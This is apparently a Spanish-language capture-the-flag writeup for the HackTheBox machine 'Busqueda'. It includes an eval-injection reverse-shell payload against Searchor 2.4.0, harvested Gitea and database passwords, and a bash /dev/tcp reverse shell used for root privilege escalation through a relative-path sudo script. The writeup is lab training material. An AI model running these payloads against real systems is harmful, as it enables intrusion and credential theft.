---
tags:
title: Busqueda - Easy (HTB)
permalink: /Busqueda-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introducci√≥n

# Reconocimiento 

```bash
nmap -sCV -p22,80 10.129.228.217                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 13:56 -03
Nmap scan report for 10.129.228.217
Host is up (0.43s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.71 seconds
```

## Website / Port 80 

La pagina en si presenta una funcion de busqueda.

![image-center](/assets/images/{D77B3529-580B-48A9-A642-E1CDBE01632E}.png)

Buscando por por ejemplo test me redirige a la siguiente pagina.

![image-center](/assets/images/{F7E0E1FF-7242-430F-A0CC-08CBA1602519}.png)

De por si no muestra mucho, adem√°s en el pie de la pagina veo que al parecer esta corriendo con `Searchor` en la versi√≥n `2.4.0`. Antes de buscar por alg√∫n tipo de vulnerabilidad voy a `fuzzear` por si encuentro algo interesante

### Feroxbuster

```bash
feroxbuster -u http://searcher.htb      
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.13.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://searcher.htb/
 üö©  In-Scope Url          ‚îÇ searcher.htb
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.13.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://searcher.htb/search
200      GET      430l      751w    13519c http://searcher.htb/
403      GET        9l       28w      277c http://searcher.htb/server-status
[############>-------] - 3m     18805/30001   89s     found:3       errors:1      
üö® Caught ctrl+c üö® saving scan state to ferox-http_searcher_htb_-1764263975.state ...
[############>-------] - 3m     18810/30001   89s     found:3       errors:1      
[############>-------] - 3m     18800/30000   120/s   http://searcher.htb/ 
```

## Shell as svc

Como el escaneo no muestra nada proceso a buscar por vulnerabilidades y me encuentro con este [enlace](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-) el cual muestra un PoC de una vulnerabilidad de este Servicio el cual se cataloga como `CVE-2023-43364`, el cual me permite una ejecuci√≥n remota de comando a trav√©s de una mala sanitizaci√≥n del c√≥digo por el uso de `eval()`.
### PoC

El mismo muestra que aparentemente el c√≥digo vulnerable es este:

```python
_url = eval( f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})" )_
```

De manera que el mismo blog muestra un `PoC` el cual puedo usar para recibir la shell.

```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.17.19',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Lo lanzo en la `query`. Y desde mi `listener` recibo la shell como `svc`.

```bash
nc -nlvp 4444       
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.228.217] 37396
/bin/sh: 0: can't access tty; job control turned off
$ whoami
svc
$
```

```bash
cat /home/svc/user.txt
155535be72a7386ab67f791957b77763
```

## Gitea as cody

En el directorio `/var/www/app/.git` veo un archivo config de `gitea` con credenciales del usuario `cody`.

```bash
svc@busqueda:/var/www/app/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

As√≠ que con las mismas me voy a loguearme directo a este servicio en la url `http://gitea.searcher.htb`. Sin emabrgo no encuentro nada de nada. 

```bash
svc@busqueda:/var/www/app/.git$ sudo -l 
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:/var/www/app/.git$ cat /opt/scripts/system-checkup.py
```

## Shell as root

### Enumeration

Usando la misma pass de `cody` para el usuario `svc` veo que es valida, y ademas veo que tengo la capacidad de ejecutar un script como el usuario `root`.

```bash
svc@busqueda:/var/www/app/.git$ sudo -l 
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:/var/www/app/.git$ cat /opt/scripts/system-checkup.py
```

### Docker

Si lo ejecuto usando el par√°metro `--help` veo el siguiente panel de ayuda.

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py --help
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

## Gitea as administrator

Veo que tengo la capacidad de listar `container` de `docker` e `inspeccionarlos` entre otras funcionalidades.
Viendo que `containers` son los existentes..

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint‚Ä¶"   2 years ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s‚Ä¶"   2 years ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Veo dos por lo que puedo usar el comando `docker-inspect` para ver el contenido de `gitea`

{% raw %}
```bash
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{.Config.Env}}' gitea
[USER_UID=115 USER_GID=121 GITEA__database__DB_TYPE=mysql GITEA__database__HOST=db:3306 GITEA__database__NAME=gitea GITEA__database__USER=gitea GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea]
```
{% endraw %}

Veo lo que parecen ser credenciales, las cuales podr√≠an ser del usuario `administrator` en `gitea`, probando las mismas veo que son validas y ademas veo que tiene acceso a un repositorio llamado `scripts`.

![image-center](/assets/images/{D0FE3889-21A8-48E1-B6BB-5113503EC65C}.png)

### Analizing code

```bash
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

### Relative path abuse

Dentro del mismo esta el script el cual yo corro como `root` el cual tiene ese contenido. La vulnerabilidad reside cuando se llama a `full-checkup`, haciendo que cuando yo ejecuto `sudo python3 script.py full-checkup` se llame a la funci√≥n `process_action` ejecutando el script `full-checkup.sh` pero desde el directorio desde donde ejecuto el script.

Si ejecuto el script por si solo ahora me pasa al error y me devuelve `Something went wrong`.

```bash
svc@busqueda:/tmp/falsedir$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

Por lo que puedo crear un script en `bash` con el mismo nombre con el siguiente contenido.

```bash
#!/bin/bash
/bin/bash -i &> /dev/tcp/10.10.17.19/443 0>&1
```

Este se va a encargar de que cuando ejecute el script me envie una `shell` a mi maquina como `root` debido a que el script lo ejecuto con `sudo`. Ahora solo me queda ejecuta el script nuevamente.

```bash
svc@busqueda:/tmp/falsedir$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Y desde mi listener `nc` recibo la shell como `root`.

```bash
sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.228.217] 35974
root@busqueda:/tmp/falsedir# whoami
whoami
root
```

```bash
root@busqueda:/tmp/falsedir# cat /root/root.txt
cat /root/root.txt
f035a938600c568f9c19c7798b45a142
```

`~ Happy Hacking.`
